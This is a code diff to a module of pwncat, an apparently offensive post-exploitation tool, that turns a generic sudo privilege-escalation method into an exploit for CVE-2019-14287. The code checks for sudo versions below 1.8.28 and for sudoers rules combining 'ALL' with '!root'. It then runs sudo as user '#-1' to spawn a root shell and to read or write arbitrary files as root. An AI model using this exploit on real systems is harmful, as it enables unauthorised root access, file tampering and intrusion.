@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 from typing import List
+import re
 
 from colorama import Fore, Style
+from packaging import version
 
 import pwncat
 from pwncat import util
@@ -12,8 +14,8 @@ from pwncat.privesc import BaseMethod, PrivescError, Technique
 
 class Method(BaseMethod):
 
-    name = "sudo"
-    id = "sudo"
+    name = "cve2019-14287"
+    id = "cve2019-14287"
     BINARIES = ["sudo"]
 
     def enumerate(
@@ -21,43 +23,36 @@ class Method(BaseMethod):
     ) -> List[Technique]:
         """ Find all techniques known at this time """
 
+        sudo_fixed_version = '1.8.28'
+
+        try:
+            # Check the sudo version number
+            sudo_version = pwncat.victim.enumerate.first("system.sudo_version")
+        except FileNotFoundError:
+            return
+
+        if version.parse(sudo_version.data.version) >= version.parse(sudo_fixed_version):
+            # Patched version, no need to even check privs
+            return
+
         rules = []
         for fact in pwncat.victim.enumerate("sudo"):
-
             progress.update(task, step=str(fact.data))
 
             # Doesn't appear to be a user specification
             if not fact.data.matched:
                 continue
 
-            # This specifies a user that is not us
-            if (
-                fact.data.user != "ALL"
-                and fact.data.user != pwncat.victim.current_user.name
-                and fact.data.group is None
-            ):
-                continue
-
-            # Check if we are part of the specified group
-            if fact.data.group is not None:
-                for group in pwncat.victim.current_user.groups:
-                    if fact.data.group == group.name:
-                        break
-                else:
-                    # Non of our secondary groups match, was our primary group specified?
-                    if fact.data.group != pwncat.victim.current_user.group.name:
-                        continue
-
             # The rule appears to match, add it to the list
             rules.append(fact.data)
 
         for rule in rules:
             for method in pwncat.victim.gtfo.iter_sudo(rule.command, caps=capability):
-                userlist = rule.runas_user.split(',')
-                progress.update(task, step=str(rule))
-                if len(userlist) == 1:
-                    user = "root" if rule.runas_user == "ALL" else rule.runas_user
-                    yield Technique(user, self, (method, rule), method.cap)
+                userlist = [x.strip() for x in rule.runas_user.split(',')]
+                if "ALL" in userlist and "!root" in userlist:
+                    # Matches CVE
+                    progress.update(task, step=str(rule))
+                    yield Technique("root", self, (method, rule), method.cap)
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
@@ -65,9 +60,8 @@ class Method(BaseMethod):
         method, rule = technique.ident
 
         payload, input_data, exit_command = method.build(
-            user=technique.user, shell=pwncat.victim.shell, spec=rule.command
+            user="\\#-1", shell=pwncat.victim.shell, spec=rule.command
         )
-
         try:
             pwncat.victim.sudo(payload, as_is=True, wait=False)
         except PermissionError as exc:
@@ -78,11 +72,10 @@ class Method(BaseMethod):
         return exit_command
 
     def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
-
         method, rule = technique.ident
 
         payload, input_data, exit_command = method.build(
-            user=technique.user, lfile=filepath, spec=rule.command
+            user="\\#-1", lfile=filepath, spec=rule.command
         )
 
         mode = "r"
@@ -105,11 +98,10 @@ class Method(BaseMethod):
         return method.wrap_stream(pipe)
 
     def write_file(self, filepath: str, data: bytes, technique: Technique):
-
         method, rule = technique.ident
 
         payload, input_data, exit_command = method.build(
-            user=technique.user, lfile=filepath, spec=rule.command, length=len(data)
+            user="\\#-1", lfile=filepath, spec=rule.command, length=len(data)
         )
 
         mode = "w"
@@ -134,12 +126,4 @@ class Method(BaseMethod):
 
     def get_name(self, tech: Technique):
         """ Get the name of the given technique for display """
-        return (
-            (f"[cyan]{tech.ident[0].binary_path}[/cyan] ([red]sudo")
-            + (
-                ""
-                if "NOPASSWD" not in tech.ident[1].options
-                else f" [bold]NOPASSWD[/bold]"
-            )
-            + "[/red])"
-        )
+        return f"[cyan]{tech.ident[0].binary_path}[/cyan] ([red]sudo CVE-2019-14287[/red])"
